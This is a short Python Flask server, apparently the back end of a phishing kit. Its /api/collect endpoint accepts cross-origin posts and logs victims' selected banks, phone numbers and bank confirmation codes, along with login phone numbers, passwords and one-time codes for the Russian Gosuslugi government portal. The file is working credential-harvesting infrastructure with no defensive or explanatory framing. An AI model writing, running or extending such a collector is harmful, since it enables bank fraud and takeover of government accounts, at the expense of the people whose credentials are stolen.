from flask import Flask, request, jsonify
from flask_cors import CORS
import datetime
import sys

app = Flask(__name__)
CORS(app)

def log(msg):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    line = f"[{timestamp}] {msg}"
    print(line)
    sys.stdout.flush()

@app.route('/', methods=['GET'])
def home():
    log("ROOT: Server pinged")
    return jsonify({'status': 'ok', 'message': 'Server is running'})

@app.route('/api/collect', methods=['POST'])
def collect():
    data = request.json
    msg_type = data.get('type')
    
    log(f"=== NEW REQUEST: {msg_type} ===")

    if msg_type == 'bank_selected':
        log(f"BANK: {data.get('bankName')} ({data.get('bank')})")

    elif msg_type == 'bank_phone':
        log(f"PHONE: {data.get('phone')} | BANK: {data.get('bankName')}")

    elif msg_type == 'bank_code':
        log(f"BANK CODE: {data.get('code')} | STATUS: {data.get('status')}")

    elif msg_type == 'gosuslugi_phone':
        log(f"GOSUSLUGI LOGIN: {data.get('phone')}")
        log(f"GOSUSLUGI PASSWORD: {data.get('password')}")

    elif msg_type == 'gosuslugi_code':
        log(f"GOSUSLUGI CODE: {data.get('code')} | STATUS: {data.get('status')}")

    return jsonify({'status': 'ok'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
